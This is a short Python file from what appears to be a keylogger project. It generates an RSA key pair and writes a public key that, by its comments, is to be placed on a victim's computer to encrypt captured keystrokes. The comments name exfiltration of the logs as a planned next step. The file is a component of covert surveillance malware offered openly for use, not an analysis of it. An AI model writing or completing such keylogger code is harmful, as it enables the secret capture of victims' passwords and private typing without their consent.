# Implementing encryption for keylogs

from Crypto.PublicKey import RSA
import keyboard
import os

# Generate a public and private key!
key = RSA.generate(2048)
encrypted_key = key.export_key(passphrase='z5432894', pkcs=8, protection="scryptAndAES128-CBC", prot_params={'iteration_count':131072})

# This private key does not leave my computer (once exfiltration is implemented).
with open("private.pem", "wb") as f:
    f.write(encrypted_key)

# This file will be present in the victims computer to encrpyt keylogs
public_key = key.publickey().export_key()
with open("receiver.pem", "wb") as f:
    f.write(public_key)
